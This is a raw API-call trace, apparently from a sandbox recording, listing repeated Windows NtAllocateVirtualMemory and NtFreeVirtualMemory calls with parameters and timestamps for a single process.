NtFreeVirtualMemory,0xffffffff#3368#1372160#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1380352#4096#0xffffffff#0#3368#0x02510000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1376256#0x023c0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1384448#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1380352#0x02510000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1388544#4096#0xffffffff#0#3368#0x023d0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1384448#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1392640#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1388544#0x023d0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1404928#4096#0xffffffff#0#3368#0x023d0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1392640#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1409024#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1404928#0x023d0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1413120#4096#0xffffffff#0#3368#0x023d0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1409024#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1417216#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1413120#0x023d0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1421312#4096#0xffffffff#0#3368#0x023d0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1417216#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1425408#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1421312#0x023d0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1433600#4096#0xffffffff#0#3368#0x023d0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1425408#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1437696#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1433600#0x023d0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1445888#4096#0xffffffff#0#3368#0x023d0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1437696#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1449984#4096#0xffffffff#0#3368#0x02540000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1445888#0x023d0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1466368#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1449984#0x02540000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1470464#4096#0xffffffff#0#3368#0x023e0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1466368#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1474560#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1470464#0x023e0000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1478656#4096#0xffffffff#0#3368#0x023e0000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1474560#0x02270000#32768,0,1542888075.281375
NtAllocateVirtualMemory,0#0#1482752#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.281375
NtFreeVirtualMemory,0xffffffff#3368#1478656#0x023e0000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1486848#4096#0xffffffff#0#3368#0x023e0000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1482752#0x02270000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1490944#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1486848#0x023e0000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1499136#4096#0xffffffff#0#3368#0x023e0000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1490944#0x02270000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1503232#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1499136#0x023e0000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1507328#4096#0xffffffff#0#3368#0x023e0000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1503232#0x02270000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1511424#4096#0xffffffff#0#3368#0x02550000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1507328#0x023e0000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1519616#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1511424#0x02550000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1523712#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1519616#0x02270000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1527808#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1523712#0x023f0000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1531904#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1527808#0x02270000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1536000#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.296375
NtFreeVirtualMemory,0xffffffff#3368#1531904#0x023f0000#32768,0,1542888075.296375
NtAllocateVirtualMemory,0#0#1540096#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1536000#0x02270000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1548288#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1540096#0x023f0000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1552384#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1548288#0x02270000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1556480#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1552384#0x023f0000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1560576#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1556480#0x02270000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1564672#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1560576#0x023f0000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1568768#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1564672#0x02270000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1572864#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1568768#0x023f0000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1576960#4096#0xffffffff#0#3368#0x023f0000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1572864#0x02270000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1581056#4096#0xffffffff#0#3368#0x02580000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1576960#0x023f0000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1585152#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1581056#0x02580000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1589248#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1585152#0x02270000#32768,0,1542888075.312375
NtAllocateVirtualMemory,0#0#1593344#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.312375
NtFreeVirtualMemory,0xffffffff#3368#1589248#0x02400000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1597440#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1593344#0x02270000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1601536#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1597440#0x02400000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1605632#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1601536#0x02270000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1609728#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1605632#0x02400000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1613824#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1609728#0x02270000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1617920#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1613824#0x02400000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1622016#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1617920#0x02270000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1626112#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1622016#0x02400000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1630208#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.328375
NtFreeVirtualMemory,0xffffffff#3368#1626112#0x02270000#32768,0,1542888075.328375
NtAllocateVirtualMemory,0#0#1634304#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1630208#0x02400000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1638400#4096#0xffffffff#0#3368#0x02400000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1634304#0x02270000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1642496#4096#0xffffffff#0#3368#0x02590000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1638400#0x02400000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1646592#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1642496#0x02590000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1650688#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1646592#0x02270000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1654784#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1650688#0x02410000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1658880#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1654784#0x02270000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1662976#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1658880#0x02410000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1667072#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1662976#0x02270000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1671168#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1667072#0x02410000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1675264#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1671168#0x02270000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1679360#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1675264#0x02410000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1683456#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.343375
NtFreeVirtualMemory,0xffffffff#3368#1679360#0x02270000#32768,0,1542888075.343375
NtAllocateVirtualMemory,0#0#1687552#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.359375
NtFreeVirtualMemory,0xffffffff#3368#1683456#0x02410000#32768,0,1542888075.359375
NtAllocateVirtualMemory,0#0#1691648#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.359375
NtFreeVirtualMemory,0xffffffff#3368#1687552#0x02270000#32768,0,1542888075.359375
NtAllocateVirtualMemory,0#0#1695744#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.359375
NtFreeVirtualMemory,0xffffffff#3368#1691648#0x02410000#32768,0,1542888075.359375
NtAllocateVirtualMemory,0#0#1699840#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.359375
NtFreeVirtualMemory,0xffffffff#3368#1695744#0x02270000#32768,0,1542888075.359375
NtAllocateVirtualMemory,0#0#1703936#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.359375
NtFreeVirtualMemory,0xffffffff#3368#1699840#0x02410000#32768,0,1542888075.359375
NtAllocateVirtualMemory,0#0#1708032#4096#0xffffffff#0#3368#0x02410000#4,0,1542888075.359375
NtFreeVirtualMemory,0xffffffff#3368#1703936#0x02270000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1712128#4096#0xffffffff#0#3368#0x025c0000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1708032#0x02410000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1716224#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1712128#0x025c0000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1720320#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1716224#0x02270000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1724416#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1720320#0x02420000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1728512#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1724416#0x02270000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1732608#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1728512#0x02420000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1736704#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.375375
NtFreeVirtualMemory,0xffffffff#3368#1732608#0x02270000#32768,0,1542888075.375375
NtAllocateVirtualMemory,0#0#1740800#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1736704#0x02420000#32768,0,1542888075.390375
NtAllocateVirtualMemory,0#0#1744896#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1740800#0x02270000#32768,0,1542888075.390375
NtAllocateVirtualMemory,0#0#1748992#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1744896#0x02420000#32768,0,1542888075.390375
NtAllocateVirtualMemory,0#0#1753088#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1748992#0x02270000#32768,0,1542888075.390375
NtAllocateVirtualMemory,0#0#1757184#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1753088#0x02420000#32768,0,1542888075.390375
NtAllocateVirtualMemory,0#0#1761280#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1757184#0x02270000#32768,0,1542888075.390375
NtAllocateVirtualMemory,0#0#1765376#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.390375
NtFreeVirtualMemory,0xffffffff#3368#1761280#0x02420000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1769472#4096#0xffffffff#0#3368#0x02420000#4,0,1542888075.406375
NtFreeVirtualMemory,0xffffffff#3368#1765376#0x02270000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1773568#4096#0xffffffff#0#3368#0x025d0000#4,0,1542888075.406375
NtFreeVirtualMemory,0xffffffff#3368#1769472#0x02420000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1777664#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.406375
NtFreeVirtualMemory,0xffffffff#3368#1773568#0x025d0000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1781760#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.406375
NtFreeVirtualMemory,0xffffffff#3368#1777664#0x02270000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1785856#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.406375
NtFreeVirtualMemory,0xffffffff#3368#1781760#0x02430000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1789952#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.406375
NtFreeVirtualMemory,0xffffffff#3368#1785856#0x02270000#32768,0,1542888075.406375
NtAllocateVirtualMemory,0#0#1794048#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1789952#0x02430000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1798144#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1794048#0x02270000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1802240#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1798144#0x02430000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1806336#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1802240#0x02270000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1810432#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1806336#0x02430000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1814528#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1810432#0x02270000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1818624#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1814528#0x02430000#32768,0,1542888075.421375
NtAllocateVirtualMemory,0#0#1822720#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.421375
NtFreeVirtualMemory,0xffffffff#3368#1818624#0x02270000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1826816#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1822720#0x02430000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1830912#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1826816#0x02270000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1835008#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1830912#0x02430000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1839104#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1835008#0x02270000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1843200#4096#0xffffffff#0#3368#0x02600000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1839104#0x02430000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1847296#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1843200#0x02600000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1851392#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.437375
NtFreeVirtualMemory,0xffffffff#3368#1847296#0x02270000#32768,0,1542888075.437375
NtAllocateVirtualMemory,0#0#1855488#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1851392#0x02440000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1859584#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1855488#0x02270000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1863680#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1859584#0x02440000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1867776#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1863680#0x02270000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1871872#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1867776#0x02440000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1875968#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1871872#0x02270000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1880064#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.453375
NtFreeVirtualMemory,0xffffffff#3368#1875968#0x02440000#32768,0,1542888075.453375
NtAllocateVirtualMemory,0#0#1884160#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1880064#0x02270000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1888256#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1884160#0x02440000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1896448#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1888256#0x02270000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1900544#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1896448#0x02440000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1904640#4096#0xffffffff#0#3368#0x02440000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1900544#0x02270000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1908736#4096#0xffffffff#0#3368#0x02620000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1904640#0x02440000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1912832#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.468375
NtFreeVirtualMemory,0xffffffff#3368#1908736#0x02620000#32768,0,1542888075.468375
NtAllocateVirtualMemory,0#0#1916928#4096#0xffffffff#0#3368#0x02450000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1912832#0x02270000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1921024#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1916928#0x02450000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1925120#4096#0xffffffff#0#3368#0x02450000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1921024#0x02270000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1929216#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1925120#0x02450000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1933312#4096#0xffffffff#0#3368#0x02450000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1929216#0x02270000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1937408#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1933312#0x02450000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1941504#4096#0xffffffff#0#3368#0x02450000#4,0,1542888075.484375
NtFreeVirtualMemory,0xffffffff#3368#1937408#0x02270000#32768,0,1542888075.484375
NtAllocateVirtualMemory,0#0#1949696#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1941504#0x02450000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1953792#4096#0xffffffff#0#3368#0x02450000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1949696#0x02270000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1957888#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1953792#0x02450000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1966080#4096#0xffffffff#0#3368#0x02450000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1957888#0x02270000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1970176#4096#0xffffffff#0#3368#0x02630000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1966080#0x02450000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1974272#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1970176#0x02630000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1978368#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1974272#0x02270000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1982464#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.500375
NtFreeVirtualMemory,0xffffffff#3368#1978368#0x02460000#32768,0,1542888075.500375
NtAllocateVirtualMemory,0#0#1986560#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.515375
NtFreeVirtualMemory,0xffffffff#3368#1982464#0x02270000#32768,0,1542888075.515375
NtAllocateVirtualMemory,0#0#1990656#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.515375
NtFreeVirtualMemory,0xffffffff#3368#1986560#0x02460000#32768,0,1542888075.515375
NtAllocateVirtualMemory,0#0#1994752#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.515375
NtFreeVirtualMemory,0xffffffff#3368#1990656#0x02270000#32768,0,1542888075.515375
NtAllocateVirtualMemory,0#0#1998848#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.515375
NtFreeVirtualMemory,0xffffffff#3368#1994752#0x02460000#32768,0,1542888075.515375
NtAllocateVirtualMemory,0#0#2002944#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.515375
NtFreeVirtualMemory,0xffffffff#3368#1998848#0x02270000#32768,0,1542888075.515375
NtAllocateVirtualMemory,0#0#2007040#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.515375
NtFreeVirtualMemory,0xffffffff#3368#2002944#0x02460000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2019328#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.531375
NtFreeVirtualMemory,0xffffffff#3368#2007040#0x02270000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2023424#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.531375
NtFreeVirtualMemory,0xffffffff#3368#2019328#0x02460000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2031616#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.531375
NtFreeVirtualMemory,0xffffffff#3368#2023424#0x02270000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2039808#4096#0xffffffff#0#3368#0x02650000#4,0,1542888075.531375
NtFreeVirtualMemory,0xffffffff#3368#2031616#0x02460000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2048000#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.531375
NtFreeVirtualMemory,0xffffffff#3368#2039808#0x02650000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2072576#4096#0xffffffff#0#3368#0x02470000#4,0,1542888075.531375
NtFreeVirtualMemory,0xffffffff#3368#2048000#0x02270000#32768,0,1542888075.531375
NtAllocateVirtualMemory,0#0#2076672#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.531375
